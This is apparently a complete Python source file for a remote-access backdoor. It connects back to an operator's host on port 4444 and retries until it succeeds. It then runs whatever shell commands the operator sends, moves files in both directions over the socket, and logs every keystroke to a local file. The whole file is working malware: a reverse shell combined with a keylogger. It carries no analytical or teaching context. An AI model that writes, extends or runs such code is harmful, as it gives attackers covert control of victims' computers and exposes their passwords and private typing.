import socket
import json
import os
import subprocess
import time
import keyboard

# Define the socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(3)  # Add a short delay before retrying connection
        try:
            # Connect to a remote host with IP '192.168.56.1' and port 4444
            s.connect(('YOUR IP', 4444))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except Exception as e:
            print("Connection error:", e)
            # If a connection error occurs, retry the connection
            continue

# Function to upload a file to the remote host
def upload_file(file_name):
    try:
        with open(file_name, 'rb') as f:
            s.sendfile(f)
    except Exception as e:
        print("Error uploading file:", e)

# Function to download a file from the remote host
def download_file(file_name):
    try:
        with open(file_name, 'wb') as f:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        print("File '{}' downloaded successfully.".format(file_name))
    except Exception as e:
        print("Error downloading file:", e)

# Main shell function for command execution
def shell():
    keyboard.on_press(lambda event: keyPressed(event, s))
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
            except Exception as e:
                print("Failed to change directory:", e)
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            execute_command(command)

# Function to execute a command
def execute_command(command):
    try:
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        reliable_send(result)
    except Exception as e:
        reliable_send("Error executing command: {}".format(e))

# Key press handler function for keylogger
def keyPressed(event, s):
    key = event.name
    if len(key) == 1:
        with open("Keyfile.txt", 'a') as logkey:
            logkey.write(key)
    elif key == "space":
        with open("Keyfile.txt", 'a') as logkey:
            logkey.write(' ')
    else:
        with open("Keyfile.txt", 'a') as logkey:
            logkey.write(f' [{key}] ')

if __name__ == "__main__":
    connection()
